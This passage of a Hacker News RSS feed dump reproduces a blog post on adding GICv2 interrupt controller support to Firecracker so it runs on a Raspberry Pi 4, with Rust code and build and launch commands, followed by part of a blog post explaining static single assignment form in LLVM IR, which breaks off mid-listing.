comments made by non-listed accounts.&nbsp;</i></p>

</div></div>]]>
            </description>
            <link>https://cornucopia.cornubot.se/2020/10/september-2020-least-deadly-month-ever.html?m=1</link>
            <guid isPermaLink="false">hacker-news-small-sites-24878723</guid>
            <pubDate>Sat, 24 Oct 2020 12:22:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Porting Firecracker to a Raspberry Pi 4 (2019)]]>
            </title>
            <description>
<![CDATA[
Score 136 | Comments 15 (<a href="https://news.ycombinator.com/item?id=24878698">thread link</a>) | @k__
<br/>
October 24, 2020 | https://blog.cloudkernels.net/posts/firecracker-rpi4/ | <a href="https://web.archive.org/web/*/https://blog.cloudkernels.net/posts/firecracker-rpi4/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      

<p>Since we got our hands on the new Raspberry Pi 4, we started exploring how
various virtualization technologies behave on the board. First thing we tried is how to run <a href="https://cloudkernels.github.io/posts/rpi4-64bit-virt/">Nabla</a> on it and how it compares to native KVM.</p>

<p>Next thing we wanted to try is <a href="https://github.com/firecracker-microvm/firecracker">firecracker</a>, the notorious micro-VMM that
Amazon Lambda &amp; Fargate run on. To our disappointment, firecracker was not
<a href="https://github.com/firecracker-microvm/firecracker/issues/1196">yet</a> running on RPi4. So we started looking into coding in the necessary
changes :)</p>

<p>After a bit of investigation, we figured out that the key missing piece is
support for the GICv2 ARM interrupt controller. In fact, firecracker only
supports GIC version 3 since it was open-sourced, but not version 2, which is
the version appearing in the Raspberry Pi series, as well as in other popular
boards, like the Hikey 970 we got our hands on, or Khadas VIM3. A bit more
digging into the internals of firecracker and the Linux kernel, helped us
work out the details and open a <a href="https://github.com/firecracker-microvm/firecracker/pull/1235">pull-request</a> which adds support for the
missing parts.</p>

<h4 id="changes-in-firecracker">Changes in Firecracker</h4>

<p>The Generic Interrupt Controller (GIC) is the IP block in the ARM processors
that implements interrupt handling. The Linux kernel supports user- and
kernel-space emulation for GICv2 as well as GICv3 and v4. However, Firecracker
only handles the GICv3-related configuration of the virtual GIC (VGIC).
Similarly, setting up the FDT for the guest microVM from Firecracker only
handles GIC-v3 devices.</p>

<p>In terms of code organization, the GIC related code currently exposes a function
for setting up GICv3 performing the corresponding <code>ioctl</code> KVM commands. The
first part of our PR changes this by introducing a GIC Trait which defines the
common interface for all GIC implementations. Even though it is still under
discussion, what exactly will be in the Trait in its final form, it will be
something along the following lines:</p>
<div><pre><code data-lang="rs"><span>/// Trait for GIC devices.
</span><span></span><span>pub</span><span> </span><span>trait</span><span> </span>GICDevice<span> </span>{<span>
</span><span>    </span><span>/// Returns the GIC version of the device
</span><span></span><span>    </span><span>fn</span> <span>version</span>(<span>&amp;</span><span>self</span>)<span> </span>-&gt; <span>u32</span>;<span>
</span><span>
</span><span>    </span><span>/// Returns the file descriptor of the GIC device
</span><span></span><span>    </span><span>fn</span> <span>device_fd</span>(<span>&amp;</span><span>self</span>)<span> </span>-&gt; <span>&amp;</span><span>DeviceFd</span>;<span>
</span><span>
</span><span>    </span><span>/// Returns an array with GIC device properties
</span><span></span><span>    </span><span>fn</span> <span>device_properties</span>(<span>&amp;</span><span>self</span>)<span> </span>-&gt; <span>&amp;</span>[<span>u64</span>];<span>
</span><span></span>}<span>
</span></code></pre></div>
<p>With this in place, we can define objects per GIC version, which implement this
Trait, and still have the rest of the code deal with the <code>GICDevice</code> Trait,
which is transparent to the GIC version.</p>

<p>The implementations for each version, implement the Trait and a <code>new</code> function
which is used to create the new object:</p>
<div><pre><code data-lang="rs"><span>pub</span><span> </span><span>fn</span> <span>new</span>(vm: <span>&amp;</span><span>VmFd</span>,<span> </span>vcpu_count: <span>u64</span>)<span> </span>-&gt; <span>Result</span><span>&lt;</span><span>Box</span><span>&lt;</span>GICDevice<span>&gt;&gt;</span><span>
</span></code></pre></div>
<p>The differentiation between the two versions lays in the VGIC register
attributes that each device exposes. As a result, the work we need to do is essentially to <code>mmap</code> their addresses.</p>

<p>GICv2 relevant addresses include the <strong>distributor</strong> and <strong>cpu</strong> groups:</p>
<div><pre><code data-lang="rs"><span>/* Setting up the distributor attribute.
</span><span> We are placing the GIC below 1GB so we need to substract the size of the distributor.
</span><span>*/</span><span>
</span><span></span>set_device_attribute(<span>
</span><span>    </span><span>&amp;</span>vgic_fd,<span>
</span><span>    </span>kvm_bindings::KVM_DEV_ARM_VGIC_GRP_ADDR,<span>
</span><span>    </span><span>u64</span>::from(kvm_bindings::KVM_VGIC_V2_ADDR_TYPE_DIST),<span>
</span><span>    </span><span>&amp;</span>get_dist_addr()<span> </span><span>as</span><span> </span><span>*</span><span>const</span><span> </span><span>u64</span><span> </span><span>as</span><span> </span><span>u64</span>,<span>
</span><span>    </span><span>0</span>,<span>
</span><span></span>)<span>?</span>;<span>
</span><span>
</span><span></span><span>/* Setting up the CPU attribute.
</span><span> */</span><span>
</span><span></span>set_device_attribute(<span>
</span><span>    </span><span>&amp;</span>vgic_fd,<span>
</span><span>    </span>kvm_bindings::KVM_DEV_ARM_VGIC_GRP_ADDR,<span>
</span><span>    </span><span>u64</span>::from(kvm_bindings::KVM_VGIC_V2_ADDR_TYPE_CPU),<span>
</span><span>    </span><span>&amp;</span>get_cpu_addr()<span> </span><span>as</span><span> </span><span>*</span><span>const</span><span> </span><span>u64</span><span> </span><span>as</span><span> </span><span>u64</span>,<span>
</span><span>    </span><span>0</span>,<span>
</span><span></span>)<span>?</span>;<span>
</span></code></pre></div>
<p>whereas the GICv3 includes the <strong>distributor</strong> and <strong>redistributor</strong> groups:</p>
<div><pre><code data-lang="rs"><span>/* Setting up the distributor attribute.
</span><span> We are placing the GIC below 1GB so we need to substract the size of the distributor.
</span><span>*/</span><span>
</span><span></span>set_device_attribute(<span>
</span><span>    </span><span>&amp;</span>vgic_fd,<span>
</span><span>    </span>kvm_bindings::KVM_DEV_ARM_VGIC_GRP_ADDR,<span>
</span><span>    </span><span>u64</span>::from(kvm_bindings::KVM_VGIC_V3_ADDR_TYPE_DIST),<span>
</span><span>    </span><span>&amp;</span>get_dist_addr()<span> </span><span>as</span><span> </span><span>*</span><span>const</span><span> </span><span>u64</span><span> </span><span>as</span><span> </span><span>u64</span>,<span>
</span><span>    </span><span>0</span>,<span>
</span><span></span>)<span>?</span>;<span>
</span><span>
</span><span></span><span>/* Setting up the redistributors' attribute.
</span><span>We are calculating here the start of the redistributors address. We have one per CPU.
</span><span>*/</span><span>
</span><span></span>set_device_attribute(<span>
</span><span>    </span><span>&amp;</span>vgic_fd,<span>
</span><span>    </span>kvm_bindings::KVM_DEV_ARM_VGIC_GRP_ADDR,<span>
</span><span>    </span><span>u64</span>::from(kvm_bindings::KVM_VGIC_V3_ADDR_TYPE_REDIST),<span>
</span><span>    </span><span>&amp;</span>get_redists_addr(<span>u64</span>::from(vcpu_count))<span> </span><span>as</span><span> </span><span>*</span><span>const</span><span> </span><span>u64</span><span> </span><span>as</span><span> </span><span>u64</span>,<span>
</span><span>    </span><span>0</span>,<span>
</span><span></span>)<span>?</span>;<span>
</span></code></pre></div>
<p>Finally, for both versions of GIC we finalize the device initialization by
setting the number of supported interrupts and the <em>control_init</em> group.</p>
<div><pre><code data-lang="rs"><span>/// Finalize the setup of a GIC device
</span><span></span><span>pub</span><span> </span><span>fn</span> <span>finalize_device</span>(fd: <span>&amp;</span><span>DeviceFd</span>)<span> </span>-&gt; <span>Result</span><span>&lt;</span>()<span>&gt;</span><span> </span>{<span>
</span><span>    </span><span>/* We need to tell the kernel how many irqs to support with this vgic.
</span><span>     * See the `layout` module for details.
</span><span>     */</span><span>
</span><span>    </span><span>let</span><span> </span>nr_irqs: <span>u32</span> <span>=</span><span> </span><span>super</span>::layout::IRQ_MAX<span> </span><span>-</span><span> </span><span>super</span>::layout::IRQ_BASE<span> </span><span>+</span><span> </span><span>1</span>;<span>
</span><span>    </span><span>let</span><span> </span>nr_irqs_ptr<span> </span><span>=</span><span> </span><span>&amp;</span>nr_irqs<span> </span><span>as</span><span> </span><span>*</span><span>const</span><span> </span><span>u32</span>;<span>
</span><span>    </span>set_device_attribute(<span>
</span><span>        </span>fd,<span>
</span><span>        </span>kvm_bindings::KVM_DEV_ARM_VGIC_GRP_NR_IRQS,<span>
</span><span>        </span><span>0</span>,<span>
</span><span>        </span>nr_irqs_ptr<span> </span><span>as</span><span> </span><span>u64</span>,<span>
</span><span>        </span><span>0</span>,<span>
</span><span>    </span>)<span>?</span>;<span>
</span><span>
</span><span>    </span><span>/* Finalize the GIC.
</span><span>     * See https://code.woboq.org/linux/linux/virt/kvm/arm/vgic/vgic-kvm-device.c.html#211.
</span><span>     */</span><span>
</span><span>    </span>set_device_attribute(<span>
</span><span>        </span>fd,<span>
</span><span>        </span>kvm_bindings::KVM_DEV_ARM_VGIC_GRP_CTRL,<span>
</span><span>        </span><span>u64</span>::from(kvm_bindings::KVM_DEV_ARM_VGIC_CTRL_INIT),<span>
</span><span>        </span><span>0</span>,<span>
</span><span>        </span><span>0</span>,<span>
</span><span>    </span>)<span>?</span>;<span>
</span><span>
</span><span>    </span><span>Ok</span>(())<span>
</span><span></span>}<span>
</span></code></pre></div>
<p>Regarding the FDT creation, there are differences between v2 and v3 regarding
the interrupt controller <code>intc</code> node.</p>

<p>First, we need to define the GICv2 <code>compatible</code> property to be <code>arm,gic-400</code>,
since it is the GIC-400 chip which implements GICv2. Next is the <code>reg</code>
property of the FDT, which includes the addresses and the corresponding sizes of
the GIC registers, i.e. distributor and CPU for GICv2, distributor and
redistributor for GICv3. Finally, we fix the <code>interrupts</code> property which
determines the interrupt source of the VGIC maintenance interrupt. The
corresponding values for GICv2 were taken from the respective <a href="https://github.com/torvalds/linux/blob/master/Documentation/devicetree/bindings/interrupt-controller/arm%2Cgic.yaml">Linux Kernel entries</a>.</p>

<h4 id="build-firecracker-with-rpi4-support">Build firecracker with RPi4 support</h4>

<p>While waiting for the patch to merge upstream you can go ahead and check out it
yourself.</p>

<p>Clone and build our fork of firecracker (keep in mind that while the PR review
is going on, we might force-update the branch).</p>
<div><pre><code data-lang="bash">$ git clone https://github.com/cloudkernels/firecracker.git
$ <span>cd</span> firecracker
$ ./tools/devtool build</code></pre></div>
<p>Next you need a kernel image and a root filesystem to run with your firecracker
build. You can grab the pre-built kernel image and rootfs here:</p>
<div><pre><code data-lang="bash">$ wget https://s3.amazonaws.com/spec.ccfc.min/img/aarch64/ubuntu_with_ssh/kernel/vmlinux.bin
$ wget https://s3.amazonaws.com/spec.ccfc.min/img/aarch64/ubuntu_with_ssh/fsfiles/xenial.rootfs.ext4 </code></pre></div>
<p>Alternatively, you can build your own kernel and rootfs using the following
steps provided by the firecracker docs
<a href="https://github.com/cloudkernels/firecracker/blob/master/docs/rootfs-and-kernel-setup.md">here</a></p>

<h4 id="launch-our-image">Launch our image</h4>

<p>To launch our image we will use the <a href="https://github.com/firecracker-microvm/firectl">firectl</a> tool. We need, to setup a tap
device for the networking or our firecracker microVM.</p>
<div><pre><code data-lang="bash">$ sudo ip tuntap add dev tap0 mode tap
$ sudo ip addr add <span>172</span>.16.0.1/24 dev tap0
$ sudo ip link <span>set</span> tap0 up</code></pre></div>
<p>And we launch the microVM using firectl:</p>
<div><pre><code data-lang="bash">firectl --firecracker-binary<span>=</span><span>${</span><span>PATH_TO_FC_BIN</span><span>}</span> --kernel<span>=</span>vmlinux.bin <span>\
</span><span></span>	--tap-device<span>=</span>tap0/aa:fc:00:00:00:01 <span>\
</span><span></span>	--kernel-opts<span>=</span><span>"console=ttyS0 reboot=k panic=1 pci=off ip=172.16.0.42::172.16.0.1:255.255.255.0::eth0:off"</span> <span>\
</span><span></span>	--root-drive<span>=</span>./nginx_fc.ext4</code></pre></div>
<p>Here, we used here the <code>ip</code> kernel boot parameter to give the <code>172.16.0.42</code>.</p>

<p>Finally, we try out our nginx server:</p>
<div><pre><code data-lang="html">curl 172.16.0.42
<span>&lt;!DOCTYPE html&gt;</span>
&lt;<span>html</span>&gt;
&lt;<span>head</span>&gt;
&lt;<span>title</span>&gt;Welcome to nginx!&lt;/<span>title</span>&gt;
&lt;<span>style</span>&gt;
    <span>body</span> {
        <span>width</span>: <span>35</span><span>em</span>;
        <span>margin</span>: <span>0</span> <span>auto</span>;
        <span>font-family</span>: Tahoma, Verdana, Arial, <span>sans-serif</span>;
    }
&lt;/<span>style</span>&gt;
&lt;/<span>head</span>&gt;
&lt;<span>body</span>&gt;
&lt;<span>h1</span>&gt;Welcome to nginx!&lt;/<span>h1</span>&gt;
&lt;<span>p</span>&gt;If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.&lt;/<span>p</span>&gt;

&lt;<span>p</span>&gt;For online documentation and support please refer to
&lt;<span>a</span> <span>href</span><span>=</span><span>"http://nginx.org/"</span>&gt;nginx.org&lt;/<span>a</span>&gt;.&lt;<span>br</span>/&gt;
Commercial support is available at
&lt;<span>a</span> <span>href</span><span>=</span><span>"http://nginx.com/"</span>&gt;nginx.com&lt;/<span>a</span>&gt;.&lt;/<span>p</span>&gt;

&lt;<span>p</span>&gt;&lt;<span>em</span>&gt;Thank you for using nginx.&lt;/<span>em</span>&gt;&lt;/<span>p</span>&gt;
&lt;/<span>body</span>&gt;
&lt;/<span>html</span>&gt;</code></pre></div>
      
    </div></div>]]>
            </description>
            <link>https://blog.cloudkernels.net/posts/firecracker-rpi4/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24878698</guid>
            <pubDate>Sat, 24 Oct 2020 12:15:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Understanding static single assignment forms]]>
            </title>
            <description>
<![CDATA[
Score 40 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24878421">thread link</a>) | @signa11
<br/>
October 24, 2020 | https://blog.yossarian.net/2020/10/23/Understanding-static-single-assignment-forms | <a href="https://web.archive.org/web/*/https://blog.yossarian.net/2020/10/23/Understanding-static-single-assignment-forms">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">


<h2><em>Programming, philosophy, pedaling.</em></h2>

<ul>
    <li><a href="https://blog.yossarian.net/">Home</a></li>
    <li><a href="https://blog.yossarian.net/tags">Tags</a></li>
    <li><a href="https://blog.yossarian.net/favorites">Favorites</a></li>
    <li><a href="https://blog.yossarian.net/archive">Archive</a></li>
    
      <li><a href="https://yossarian.net/">Main Site</a></li>
    
</ul>

<hr>



<h2>
  <em>Oct 23, 2020</em>
</h2>

  <p>Tags:
  
    
    <a href="https://blog.yossarian.net/tags#llvm">llvm</a>,
    
  
    
    <a href="https://blog.yossarian.net/tags#programming">programming</a>
    
  
  </p>


<p><em>With thanks to <a href="https://twitter.com/inventednight/">Niki Carroll</a>, winny, and kurufu for their
invaluable proofreading and advice.</em></p>

<h2 id="preword">Preword</h2>

<p>By <a href="https://twitter.com/8x5clPW2/status/1311316978703970307">popular demand</a>, I’m doing another
LLVM post. This time, it’s <strong>single static assignment</strong> (or SSA) form, a common feature
in the intermediate representations of optimizing compilers.</p>

<p>Like <a href="https://blog.yossarian.net/2020/09/19/LLVMs-getelementptr-by-example">the last one</a>, SSA is a
topic in compiler and IR design that I <em>mostly</em> understand but could benefit from some self-guided
education on. So here we are.</p>

<h2 id="how-to-represent-a-program">How to represent a program</h2>

<p>At the highest level, a compiler’s job is singular: to turn some source language <em>input</em>
into some machine language <em>output</em>. Internally, this breaks down into a sequence of clearly
delineated<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> tasks:</p>

<ol>
  <li><strong>Lexing</strong> the source into a sequence of tokens</li>
  <li><strong>Parsing</strong> the token stream into an <strong>abstract syntax tree</strong>, or AST<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></li>
  <li><strong>Validating</strong> the AST (e.g., ensuring that all uses of identifiers are consistent with the
source language’s scoping and definition rules)<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></li>
  <li><strong>Translating</strong> the AST into machine code, with all of its complexities (instruction selection,
register allocation, frame generation, &amp;c)</li>
</ol>

<p>In a <strong>single-pass</strong> compiler, (4) is monolithic: machine code is generated as the compiler walks
the AST, with no revisiting of previously generated code. This is extremely fast (in terms of
compiler performance) in exchange for some a few significant limitations:</p>

<ul>
  <li>
    <p>Optimization potential: because machine code is generated in a single pass, it can’t be revisited
for optimizations. Single-pass compilers tend to generate extremely slow and <em>conservative</em>
machine code.</p>

    <p>By way of example: the
  <a href="https://raw.githubusercontent.com/wiki/hjl-tools/x86-psABI/x86-64-psABI-1.0.pdf">System V ABI</a>
  (used by Linux and macOS) defines
  <a href="https://en.wikipedia.org/wiki/Red_zone_(computing)">a special 128-byte region</a> beyond the
  current stack pointer (<code>%rsp</code>) that can be used by leaf functions whose stack frames fit within
  it. This, in turn, saves a few stack management instructions in the function prologue and
  epilogue.</p>

    <p>A single-pass compiler will struggle to take advantage of this ABI-supplied
  optimization: it needs to emit a stack slot for each automatic variable as they’re visited,
  and cannot revisit its function prologue for erasure if all variables fit within the red zone.</p>
  </li>
  <li>
    <p>Language limitations: single-pass compilers struggle with common language design decisions, like
allowing use of identifiers before their declaration or definition. For example, the following
is valid C++:</p>

    <div><div><pre><code>  <span>class</span> <span>Rect</span> <span>{</span>
  <span>public:</span>
    <span>int</span> <span>area</span><span>()</span> <span>{</span> <span>return</span> <span>width</span><span>()</span> <span>*</span> <span>height</span><span>();</span> <span>}</span>
    <span>int</span> <span>width</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
    <span>int</span> <span>height</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
  <span>};</span>
</code></pre></div>    </div>

    <p>C and C++ <em>generally</em> require pre-declaration and/or definition for identifiers, but
  member function bodies may reference the entire class scope. This will frustrate a
  single-pass compiler, which expects <code>Rect::width</code> and <code>Rect::height</code> to already exist
  in some symbol lookup table for call generation.</p>
  </li>
</ul>

<p>Consequently, (virtually) all modern compilers are <strong>multi-pass</strong>.</p>

<p><img src="https://blog.yossarian.net/assets/multipass.jpg" alt="Pictured: Leeloo Dallas from The Fifth Element holding up her multi-pass.">
<em>“multi-pass” — Leeloo Dallas</em></p>

<p>Multi-pass compilers break the <em>translation</em> phase down even more:</p>

<ol>
  <li>The AST is lowered into an <strong>intermediate representation</strong>, or IR</li>
  <li>Analyses (or passes) are performed on the IR, refining it according to some optimization
profile (code size, performance, &amp;c)</li>
  <li>The IR is either translated to machine code <em>or</em> lowered to <em>another</em> IR, for further target
specialization or optimization<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></li>
</ol>

<p>So, we want an IR that’s easy to <em>correctly</em> transform and that’s amenable to optimization. Let’s
talk about why IRs that have the <strong>static single assignment</strong> property fill that niche.</p>

<h2 id="ssa-form">SSA form</h2>

<p>At its core, the SSA form of any program source program introduces only one new constraint:
all variables are assigned (i.e., stored to) <strong>exactly once</strong>.</p>

<p>By way of example: the following (not actually very helpful) function is <strong>not</strong> in a valid SSA form
with respect to the <code>flags</code> variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags</span> <span>|=</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Why? Because <code>flags</code> is stored to twice: once for initialization, and (potentially) again inside
the conditional body.</p>

<p>As programmers, we could rewrite <code>helpful_open</code> to only ever store once to each automatic variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>But this is clumsy and repetitive: we essentially need to duplicate every chain of uses that
follow any variable that is stored to more than once. That’s not great for readability,
maintainability, or code size.</p>

<p>So, we do what we always do: make the compiler do the hard work for us. Fortunately there exists
a transformation from every valid program into an equivalent SSA form, conditioned on two simple
rules.</p>

<blockquote>
  <p>Rule #1: Whenever we see a store to an already-stored variable, we replace it with a brand
new “version” of that variable.</p>
</blockquote>

<p>Using rule #1 and the example above, we can rewrite <code>flags</code> using <code>_N</code> suffixes to indicate versions:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>// Declared up here to avoid dealing with C scopes.</span>
  <span>int</span> <span>flags_1</span><span>;</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_1</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>But wait a second: we’ve made a mistake!</p>

<ul>
  <li><code>open(..., flags_1, ...)</code> is incorrect: it unconditionally assigns <code>O_CREAT</code>, which wasn’t in the
original function semantics.</li>
  <li><code>open(..., flags_0, ...)</code> is <strong>also</strong> incorrect: it <em>never</em> assigns <code>O_CREAT</code>, and thus
is wrong for the same reason.</li>
</ul>

<p>So, what do we do? We use rule 2!</p>

<blockquote>
  <p>Rule #2: Whenever we need to <em>choose</em> a variable based on control flow, we use the Phi function
(φ) to introduce a <strong>new</strong> variable based on our choice.</p>
</blockquote>

<p>Using our example once more:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
    <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

    <span>// Declared up here to avoid dealing with C scopes.</span>
    <span>int</span> <span>flags_1</span><span>;</span>
    <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
      <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>}</span>

    <span>int</span> <span>flags_2</span> <span>=</span> <span>φ</span><span>(</span><span>flags_0</span><span>,</span> <span>flags_1</span><span>);</span>

    <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_2</span><span>,</span> <span>0644</span><span>);</span>

    <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Our quandary is resolved: <code>open</code> <strong>always</strong> takes <code>flags_2</code>, where <code>flags_2</code> is a fresh SSA variable
produced applying φ to <code>flags_0</code> and <code>flags_1</code>.</p>

<p>Observe, too, that φ is a <strong>symbolic</strong> function: compilers that use SSA forms internally do not
emit real φ functions in generated code<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>. φ exists <em>solely</em> to reconcile rule #1 with the
existence of control flow.</p>

<p>As such, it’s a little bit silly to talk about SSA forms with C examples (since C and other
high-level languages are what we’re translating from in the first place). Let’s dive into how
LLVM’s IR actually represents them.</p>

<h2 id="ssa-in-llvm">SSA in LLVM</h2>

<p>First of all, let’s see what happens when we run our very first <code>helpful_open</code> through <code>clang</code>
with no optimizations:</p>

<div><div><pre><code><span>define</span> <span>dso_local</span> <span>i32</span> <span>@helpful_open</span><span>(</span><span>i8</span><span>*</span> <span>%fname</span><span>)</span> <span>#0</span> <span>{</span>
<span>entry:</span>
  <span>%fname.addr</span> <span>=</span> <span>alloca</span> <span>i8</span><span>*,</span> <span>align</span> <span>8</span>
  <span>%flags</span> <span>=</span> <span>alloca</span> <span>i32</span><span>,</span> <span>align</span> <span>4</span>
  <span>%fd</span> <span>=</span> <span>alloca</span> <span>i32</span><span>,</span> <span>align</span> <span>4</span>
  <span>store</span> <span>i8</span><span>*</span> <span>%fname</span><span>,</span> <span>i8</span><span>**</span> <span>%fname.addr</span><span>,</span> <span>align</span> <span>8</span>
  <span>store</span> <span>i32</span> <span>2</span><span>,</span> <span>i32</span><span>*</span> <span>%flags</span><span>,</span> <span>align</span> <span>4</span>
  <span>%0</span> <span>=</span> <span>load</span> <span>i8</span><span>*,</span> <span>i8</span><span>**</span> <span>%fname.addr</span><span>,</span> <span>align</span> <span>8</span>
  <span>%call</span> <span>=</span> <span>call</span> <span>i32</span> <span>@access</span><span>(</span><span>i8</span><span>*</span> <span>%0</span><span>,</span> <span>i32</span> <span>0</span><span>)</span> <span>#4</span>
  <span>%tobool</span> <span>=</span> <span>icmp</span> <span>ne</span> <span>i32</span> <span>%call</span><span>,</span> <span>0</span>
  <span>br</span> <span>i1</span> <span>%tobool</span><span>,</span> <span>label</span> <span>%if.end</span><span>,</span> <span>label</span> <span>%if.then</span>

<span>if.then:</span>                                          <span>; preds = %entry</span>
  <span>%1</span> <span>=</span> <span>load</span> <span>i32</span><span>,</span> <span>i32</span><span>*</span> <span>%flags</span><span>,</span> <span>align</span> <span>4</span>
  <span>%or</span> <span>=</span> <span>or</span> <span>i32</span> <span>%1</span><span>,</span> <span>64</span>
  <span>store</span> <span>i32</span> <span>%or</span><span>,</span> <span>i32</span><span>*</span> <span>%flags</span><span>,</span> <span>align</span> <span>4</span>
  <span>br</span> <span>label</span> <span>%if.end</span>

<span>if.end:</span>                                           <span>; preds = %if.then, %entry</span>
  <span>%2</span> <span>=</span> <span>load</span> <span>i8</span><span>*,</span> <span>i8</span><span>**</span> <span>%fname.addr</span><span>,</span> <span>align</span> <span>8</span>
  <span>%3</span> <span>=</span> <span>load</span> <span>i32</span><span>,</span> <span>i32</span><span>*</span> <span>%flags</span><span>,</span> <span>align</span> <span>4</span>
  <span>%call1</span> <span>=</span> <span>call</span> <span>i32</span> <span>(</span><span>i8</span><span>*,</span> <span>i32</span><span>,</span> <span>...)</span> <span>@open</span><span>(</span><span>i8</span><span>*</span> <span>%2</span><span>,</span> <span>i32</span> <span>%3</span><span>,</span> <span>i32</span> <span>420</span><span>)</span>
  <span>store</span> <span>i32</span> <span>%call1</span><span>,</span> <span>i32</span><span>*</span> <span>%fd</span><span>,</span> <span>align</span> <span>4</span>
  <span>%4</span> <span>=</span> <span>load</span> <span>i32</span><span>,</span> <span>i32</span><span>*</span> <span>%fd</span><span>,</span> <span>align</span> <span>4</span>
  <span>ret</span> <span>i32</span> <span>%4</span>
<span>}</span>
</code></pre></div></div>

<p><em>(View it on <a href="https://godbolt.org/z/6ea8Pq">Godbolt</a>.)</em></p>

<p>So, we call <code>open</code> with <code>%3</code>, which comes from…a <code>load</code> from an <code>i32*</code> named <code>%flags</code>?
Where’s the φ?</p>

<p>This is something that <em>consistently</em> slips me up when reading LLVM’s IR: only <em>values</em>,
<strong>not</strong> memory, are in SSA form. Because we’ve compiled with optimizations disabled, <code>%flags</code> is
just a stack slot that we can <code>store</code> into as many times as we please, and that’s <em>exactly</em> what
LLVM has elected to do above.</p>

<p>As such, LLVM’s SSA-based optimizations aren’t all that useful when passed IR that makes direct
use of stack slots. We want to <em>maximize</em> our use of SSA variables, whenever possible, to make
future optimization passes as effective as possible.</p>

<p>This is where <a href="https://llvm.org/docs/Passes.html#mem2reg-promote-memory-to-register"><code>mem2reg</code></a> comes in:</p>

<blockquote>
  <p>This file (optimization pass) promotes memory references to be register references. It promotes
alloca instructions which only have loads and stores as uses. An alloca is transformed by using
dominator frontiers to place phi nodes, then traversing the function in depth-first order to
rewrite loads and stores as appropriate. This is just the standard SSA construction algorithm to
construct “pruned” SSA form.</p>
</blockquote>

<p>(Parenthetical mine.)</p>

<p><code>mem2reg</code> gets run at <code>-O1</code> and higher, so let’s do exactly that:</p>

<div><div><pre><code><span>define</span> <span>dso_local</span> <span>i32</span> <span>@helpful_open</span><span>(</span><span>i8</span><span>*</span> <span>nocapture</span> <span>readonly</span> <span>%fname</span><span>)</span> <span>local_unnamed_addr</span> <span>#0</span> <span>{</span>
<span>entry:</span>
  <span>%call</span> <span>=</span> <span>call</span> <span>i32</span> <span>@access</span><span>(</span><span>i8</span><span>*</span> <span>%fname</span><span>,</span> <span>i32</span> <span>0</span><span>)</span> <span>#4</span>
  <span>%tobool.not</span> <span>=</span> <span>icmp</span> <span>eq</span> <span>i32</span> <span>%call</span><span>,</span> <span>0</span>
  <span>%spec.select</span> <span>=</span> <span>select</span> <span>i1</span> <span>%tobool.not</span><span>,</span> <span>i32</span> <span>66</span><span>,</span> <span>i32</span> <span>2</span>
